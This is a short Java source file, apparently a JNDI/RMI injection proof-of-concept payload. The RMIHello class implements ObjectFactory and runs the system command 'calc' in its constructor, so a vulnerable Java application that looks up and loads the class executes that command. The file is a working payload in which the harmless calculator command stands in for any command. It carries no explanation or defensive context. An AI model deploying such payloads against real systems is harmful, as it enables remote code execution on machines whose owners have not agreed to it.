package JNDI;

import javax.naming.spi.ObjectFactory;
import java.rmi.server.UnicastRemoteObject;

public class RMIHello extends UnicastRemoteObject implements ObjectFactory {
    public RMIHello() throws java.rmi.RemoteException {
        super();
        try{
            Runtime.getRuntime().exec("calc");
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public Object getObjectInstance(Object obj, javax.naming.Name name, javax.naming.Context nameCtx, java.util.Hashtable<?, ?> environment) throws Exception {
        return null;
    }

    public String sayHello(String name) throws java.rmi.RemoteException {
        System.out.println("Hello " + name);
        return "Hello " + name;
    }
}
